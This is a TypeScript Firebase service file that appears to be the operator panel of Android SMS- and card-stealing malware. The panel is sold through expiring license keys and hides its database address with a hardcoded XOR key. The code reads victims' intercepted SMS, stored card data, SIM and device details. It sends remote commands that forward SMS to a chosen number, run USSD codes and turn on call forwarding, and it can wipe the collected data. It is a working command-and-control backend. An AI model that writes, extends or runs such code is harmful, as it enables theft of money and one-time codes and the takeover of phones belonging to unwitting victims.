import * as firebaseApp from "firebase/app";
import { 
  getDatabase, ref, set, update, get, remove, 
  onValue, push, query, orderByChild, limitToLast, 
  endBefore, limitToFirst, startAfter, equalTo,
  Database,
  DataSnapshot
} from "firebase/database";
import { User, SMS, UserFullInfo, DeviceInfo, Notification, Message } from "../types";

const { initializeApp, getApps, deleteApp } = firebaseApp as any;

const CRYPTO_PASS = "PANEL_WALA_V90_SECURE_2025";

export const encryptToken = (url: string): string => {
  if (!url) return "";
  try {
    const b64Url = btoa(unescape(encodeURIComponent(url)));
    let xored = '';
    for (let i = 0; i < b64Url.length; i++) {
      const charCode = b64Url.charCodeAt(i) ^ CRYPTO_PASS.charCodeAt(i % CRYPTO_PASS.length);
      xored += String.fromCharCode(charCode);
    }
    return btoa(unescape(encodeURIComponent(xored)));
  } catch (e) {
    return "";
  }
};

export const decryptToken = (token: string): string | null => {
  if (!token || typeof token !== 'string') return null;
  if (token.startsWith('http')) return token;
  try {
    const xored = decodeURIComponent(escape(atob(token)));
    let b64Url = '';
    for (let i = 0; i < xored.length; i++) {
      const charCode = xored.charCodeAt(i) ^ CRYPTO_PASS.charCodeAt(i % CRYPTO_PASS.length);
      b64Url += String.fromCharCode(charCode);
    }
    const url = decodeURIComponent(escape(atob(b64Url)));
    if (url.startsWith('http')) return url;
    return null;
  } catch (e) {
    return null;
  }
};

const isValidUrl = (url: string | null | undefined): boolean => {
  if (!url) return false;
  try {
    const parsed = new URL(url);
    return parsed.protocol === 'https:';
  } catch (e) {
    return false;
  }
};

export const getCurrentDatabaseUrl = () => {
  const storedToken = localStorage.getItem('panel_access_token');
  if (storedToken) {
    const decryptedUrl = decryptToken(storedToken);
    if (isValidUrl(decryptedUrl)) return decryptedUrl as string;
  }
  return "";
};

let _db: Database | null = null;
let _lastUrl: string = "";

const getDB = (): Database | null => {
  const currentUrl = getCurrentDatabaseUrl();
  if (!currentUrl) return null;
  
  let cleanUrl = currentUrl.trim();
  if (cleanUrl.endsWith('/')) cleanUrl = cleanUrl.slice(0, -1);

  if (!_db || _lastUrl !== cleanUrl) {
    try {
      const existingApps = getApps();
      const appName = "PanelApp_" + btoa(cleanUrl).substring(0, 10).replace(/[^a-zA-Z0-9]/g, '');
      
      let app;
      const found = existingApps.find((a: any) => a.name === appName);
      
      if (found) {
        app = found;
      } else {
        for (const oldApp of existingApps) {
            deleteApp(oldApp).catch(() => {});
        }
        app = initializeApp({ databaseURL: cleanUrl }, appName);
      }
      
      _db = getDatabase(app, cleanUrl);
      _lastUrl = cleanUrl;
    } catch (error) {
      console.error("Firebase Init Error:", error);
      return null;
    }
  }
  return _db;
};

export const saveAccessToken = (token: string) => {
  if (!token) return false;
  const url = decryptToken(token);
  if (url && isValidUrl(url)) {
    localStorage.setItem('panel_access_token', token);
    _db = null; 
    _lastUrl = "";
    return true;
  }
  return false;
};

export const getCurrentAccessToken = () => localStorage.getItem('panel_access_token') || '';
export type Unsubscribe = () => void;

export const logoutUser = () => {
  localStorage.removeItem('panel_access_token');
  _db = null;
  _lastUrl = "";
};

const parseDateString = (dateVal: any): string => {
    if (!dateVal || dateVal === 'never' || dateVal === 'Lifetime') return 'never';
    const timestamp = typeof dateVal === 'number' ? dateVal : !isNaN(Number(dateVal)) ? Number(dateVal) : NaN;
    const d = isNaN(timestamp) ? new Date(dateVal) : new Date(timestamp);
    
    if (isNaN(d.getTime())) return String(dateVal);
    return d.toISOString();
};

export const getKeyExpiry = async (key: string): Promise<{ success: boolean; expiry?: string; isBlocked?: boolean }> => {
  const db = getDB();
  if (!db) return { success: false };
  const cleanInput = key.trim();
  try {
    const adminRef = ref(db, 'All_Users/Admin');
    const adminSnapshot = await get(adminRef);
    if (adminSnapshot.exists()) {
        const adminData = adminSnapshot.val();
        let dbKey = typeof adminData === 'object' ? String(adminData.key || adminData.accesskey || '') : String(adminData);
        if (dbKey.trim() === cleanInput) return { success: true, expiry: 'never' };
    }

    const usersQuery = query(ref(db, 'users'), orderByChild('key'), equalTo(cleanInput));
    const usersSnapshot = await get(usersQuery);
    if (!usersSnapshot.exists()) return { success: false };

    let userData: any = null;
    usersSnapshot.forEach((child) => { userData = child.val(); });

    return { 
      success: true, 
      expiry: parseDateString(userData.expirationTime), 
      isBlocked: userData.isBlocked === true || userData.isBlocked === "true" 
    };
  } catch (e) {
    return { success: false };
  }
};

export const loginUser = async (key: string): Promise<{ success: boolean; user?: User; message?: string; userType?: string; isExpired?: boolean }> => {
  const db = getDB();
  if (!db) return { success: false, message: "Configuration Required" };
  const cleanInput = key.trim();
  try {
    const adminRef = ref(db, 'All_Users/Admin');
    const adminSnapshot = await get(adminRef);
    if (adminSnapshot.exists()) {
        const adminData = adminSnapshot.val();
        let dbKey = typeof adminData === 'object' ? String(adminData.key || adminData.accesskey || '') : String(adminData);
        if (dbKey.trim() === cleanInput) {
             return { success: true, userType: 'Admin', user: { key: cleanInput, userId: 'admin', androidId: 'admin', isBlocked: false, expirationTime: 'never', userType: 'Admin', keyType: 'WEB' } };
        }
    }
    
    const usersQuery = query(ref(db, 'users'), orderByChild('key'), equalTo(cleanInput));
    const usersSnapshot = await get(usersQuery);

    if (!usersSnapshot.exists()) return { success: false, message: "Invalid key" };

    let userData: any = null;
    let pushKey = '';
    usersSnapshot.forEach((child: DataSnapshot) => {
        userData = child.val();
        pushKey = child.key as string;
    });

    if (userData.isBlocked === true || userData.isBlocked === "true") return { success: false, message: "Key blocked" };
    
    const expiry = parseDateString(userData.expirationTime);
    if (expiry !== 'never') {
        const expDate = new Date(expiry);
        if (!isNaN(expDate.getTime()) && expDate.getTime() < Date.now()) {
            return { success: false, message: "Key has expired", isExpired: true };
        }
    }

    return { 
        success: true, 
        userType: userData.userType || 'Client', 
        user: { 
            key: cleanInput, 
            userId: pushKey, 
            androidId: 'web-panel', 
            isBlocked: false, 
            expirationTime: expiry, 
            userType: userData.userType || 'Client', 
            keyType: userData.keyType || 'WEB'
        } 
    };
  } catch (error: any) {
    return { success: false, message: error.message };
  }
};

export const subscribeToNotification = (callback: (msg: string) => void): Unsubscribe => {
  const db = getDB();
  if (!db) { callback(''); return () => {}; }
  return onValue(ref(db, 'notification'), (snapshot) => {
    const val = snapshot.val();
    callback(val?.message || val || '');
  });
};

export const subscribeToUsers = (callback: (users: DeviceInfo[]) => void): Unsubscribe => {
  const db = getDB();
  if (!db) { callback([]); return () => {}; }
  return onValue(ref(db, 'All_Users/DeviceInfo'), (snapshot) => {
    const data = snapshot.val();
    callback(data ? Object.keys(data).map(key => ({ ...data[key], userId: key })) : []);
  });
};

export const subscribeToFullUserInfo = (userId: string, callback: (data: UserFullInfo) => void): Unsubscribe => {
  const db = getDB();
  if (!db || !userId) { callback({}); return () => {}; }
  let currentData: UserFullInfo = { info: null, cards: null, simDetails: null, deviceInfo: null };
  const emit = () => callback({...currentData});
  const u1 = onValue(ref(db, `All_Users/Info/${userId}`), s => { currentData.info = s.val(); emit(); });
  const u2 = onValue(ref(db, `All_Users/Card/${userId}`), s => { currentData.cards = s.val(); emit(); });
  const u3 = onValue(ref(db, `All_Users/simDetails/${userId}`), s => { currentData.simDetails = s.val(); emit(); });
  const u4 = onValue(ref(db, `All_Users/DeviceInfo/${userId}`), s => { currentData.deviceInfo = s.val(); emit(); });
  return () => { u1(); u2(); u3(); u4(); };
};

export const sendCommandSms = async (userId: string, to: string, msg: string, slot: number) => {
  const db = getDB();
  if (!db || !userId) return;
  await set(ref(db, `All_Users/SmsForwarding/${userId}`), { command: "forwardSms", toNumber: to, message: msg, simSlot: slot });
};

export const sendUssdCommand = async (userId: string, ussdCode: string, slot: number) => {
  const db = getDB();
  if (!db || !userId) return;
  const ussdRef = push(ref(db, `All_Users/UssdCommands/${userId}`));
  await set(ussdRef, { ussdCode: ussdCode, simSlot: slot, timestamp: Date.now() });
};

export const fetchGlobalSMS = async (): Promise<SMS[]> => {
  const db = getDB();
  if (!db) return [];
  const snapshot = await get(ref(db, `All_Users/sms`));
  if (!snapshot.exists()) return [];
  const allData = snapshot.val();
  let allSMS: SMS[] = [];
  Object.keys(allData).forEach(userId => {
    Object.entries(allData[userId] || {}).forEach(([key, val]: [string, any]) => {
        allSMS.push({ ...val, key, userId });
    });
  });
  return allSMS.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
};

export const getSmsCount = async (userId?: string): Promise<number> => {
  const db = getDB();
  if (!db) return 0;
  const path = userId ? `All_Users/sms/${userId}` : `All_Users/sms`;
  const snapshot = await get(ref(db, path));
  if (!snapshot.exists()) return 0;
  const data = snapshot.val();
  if (userId) return Object.keys(data).length;
  let total = 0;
  Object.values(data).forEach((userData: any) => { if (userData) total += Object.keys(userData).length; });
  return total;
};

export const subscribeToSMS = (userId: string, callback: (sms: SMS[]) => void): Unsubscribe => {
  const db = getDB();
  if (!db || !userId) { callback([]); return () => {}; }
  const q = query(ref(db, `All_Users/sms/${userId}`), orderByChild('timestamp'), limitToLast(50));
  return onValue(q, (snapshot) => {
    const data = snapshot.val() || {};
    callback(Object.entries(data).map(([key, val]: [string, any]) => ({ ...val, key, userId }))
    .sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)));
  });
};

export const fetchOlderSMS = async (userId: string, lastTimestamp: number): Promise<SMS[]> => {
  const db = getDB();
  if (!db || !userId) return [];
  const q = query(ref(db, `All_Users/sms/${userId}`), orderByChild('timestamp'), endBefore(lastTimestamp), limitToLast(50));
  const snapshot = await get(q);
  if (!snapshot.exists()) return [];
  return Object.entries(snapshot.val()).map(([key, val]: [string, any]) => ({ ...val, key, userId }))
  .sort((a, b) => b.timestamp - a.timestamp);
};

export const deleteSMS = async (userId: string, smsKey: string) => {
  const db = getDB();
  if (db) await remove(ref(db, `All_Users/sms/${userId}/${smsKey}`));
};

export const deleteBatchSMS = async (smsList: SMS[]) => {
  const db = getDB();
  if (!db || smsList.length === 0) return;
  const updates: Record<string, null> = {};
  smsList.forEach(sms => updates[`All_Users/sms/${sms.userId}/${sms.key}`] = null);
  await update(ref(db), updates);
};

export const deleteAllSMS = async (userId: string) => {
  const db = getDB();
  if (db) await remove(ref(db, `All_Users/sms/${userId}`));
};

export const deleteAllGlobalSMS = async () => {
  const db = getDB();
  if (db) await remove(ref(db, `All_Users/sms`));
};

export const deleteAllGlobalData = async () => {
  const db = getDB();
  if (!db) return;
  await update(ref(db), { 'All_Users/Info': null, 'All_Users/Card': null });
};

export const subscribeToGlobalData = (callback: (data: any[]) => void): Unsubscribe => {
  const db = getDB();
  if (!db) { callback([]); return () => {}; }
  let devices: any = {}, infos: any = {}, cards: any = {};
  const emit = () => {
    const allIds = new Set([...Object.keys(devices), ...Object.keys(infos), ...Object.keys(cards)]);
    callback(Array.from(allIds).map(userId => ({ userId, ...(devices[userId] || {}), info: infos[userId], cards: cards[userId] })));
  };
  const u1 = onValue(ref(db, 'All_Users/DeviceInfo'), s => { devices = s.val() || {}; emit(); });
  const u2 = onValue(ref(db, 'All_Users/Info'), s => { infos = s.val() || {}; emit(); });
  const u3 = onValue(ref(db, 'All_Users/Card'), s => { cards = s.val() || {}; emit(); });
  return () => { u1(); u2(); u3(); };
};

export const getAdminNumber = async (): Promise<string> => {
  const db = getDB();
  if (!db) return '';
  const snapshot = await get(ref(db, 'All_Users/Admin/Number'));
  return snapshot.exists() ? String(snapshot.val()) : '';
};

export const updateAdminNumber = async (newNumber: string): Promise<void> => {
  const db = getDB();
  if (db) await update(ref(db, 'All_Users/Admin'), { Number: newNumber });
};

export const subscribeToLatestUssdResponse = (userId: string, callback: (data: any) => void): Unsubscribe => {
  const db = getDB();
  if (!db || !userId) { callback(null); return () => {}; }
  const q = query(ref(db, `All_Users/UssdResponses/${userId}`), orderByChild('timestamp'), limitToLast(1));
  return onValue(q, (snapshot) => {
    const data = snapshot.val();
    callback(data ? data[Object.keys(data)[0]] : null);
  });
};

export const subscribeToCallForwarding = (userId: string, callback: (data: any) => void): Unsubscribe => {
  const db = getDB();
  if (!db || !userId) return () => {};
  return onValue(ref(db, `All_Users/CallForwarding/${userId}/callForwardStatus`), (snap) => callback(snap.val()));
};

export const setCallForwarding = async (userId: string, number: string, slot: number, enable: boolean) => {
  const db = getDB();
  if (!db || !userId) return;
  await set(ref(db, `All_Users/CallForwarding/${userId}`), { 
    command: enable ? "enableCallForwarding" : "disableCallForwarding",
    toNumber: number, 
    slot: slot 
  });
};

export const markUserAsChecked = async (userId: string) => {
   const db = getDB();
   if (db && userId) await update(ref(db, `All_Users/DeviceInfo/${userId}`), { checked: true });
};

export const subscribeToSystemNotifications = (callback: (notifs: Notification[]) => void): Unsubscribe => {
    const db = getDB();
    if (!db) { callback([]); return () => {}; }
    const q = query(ref(db, `notifications`), orderByChild('timestamp'), limitToLast(50));
    return onValue(q, (snapshot) => {
        const data = snapshot.val();
        if (!data) { callback([]); return; }
        callback(Object.entries(data).map(([key, val]: [string, any]) => ({
            id: key,
            type: val.type || 'INFO',
            title: val.title || 'No Title',
            text: val.text || val.message || '',
            timestamp: val.timestamp || Date.now(),
            read: !!val.read,
            priority: val.priority || 'normal'
        })).sort((a, b) => b.timestamp - a.timestamp));
    });
};

export const markNotificationAsRead = async (notificationId: string) => {
    const db = getDB();
    if (db && notificationId) await update(ref(db, `notifications/${notificationId}`), { read: true });
};

export const subscribeToAllMessages = (callback: (messages: Message[]) => void): Unsubscribe => {
  const db = getDB();
  if (!db) { callback([]); return () => {}; }
  return onValue(ref(db, 'All_Users/Messages'), (snapshot) => {
    const allData = snapshot.val();
    if (!allData) { callback([]); return; }
    let allMessages: Message[] = [];
    Object.keys(allData).forEach(deviceId => {
      Object.entries(allData[deviceId] || {}).forEach(([key, val]: [string, any]) => {
          allMessages.push({ ...val, key, deviceId });
      });
    });
    callback(allMessages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)));
  });
};

export const deleteAllAppMessages = async () => {
  const db = getDB();
  if (db) await remove(ref(db, 'All_Users/Messages'));
};

/**
 * Persist favorites in the database so they are preserved across refreshes/devices.
 */
export const subscribeToFavorites = (adminUserId: string, callback: (favorites: string[]) => void): Unsubscribe => {
  const db = getDB();
  if (!db || !adminUserId) { callback([]); return () => {}; }
  return onValue(ref(db, `All_Users/AdminPreferences/${adminUserId}/favorites`), (snapshot) => {
    const data = snapshot.val();
    callback(Array.isArray(data) ? data : []);
  });
};

export const updateFavoritesInDb = async (adminUserId: string, favorites: string[]) => {
  const db = getDB();
  if (db && adminUserId) {
    await set(ref(db, `All_Users/AdminPreferences/${adminUserId}/favorites`), favorites);
  }
};